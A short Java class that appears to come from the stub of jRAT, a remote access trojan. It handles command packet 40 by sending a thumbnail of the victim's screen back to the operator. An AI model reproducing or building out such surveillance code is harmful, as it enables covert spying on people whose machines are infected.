package su.jrat.stub.packets.incoming;

import su.jrat.stub.Screen;

public class Packet40Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Screen.sendThumbnail();
	}

}
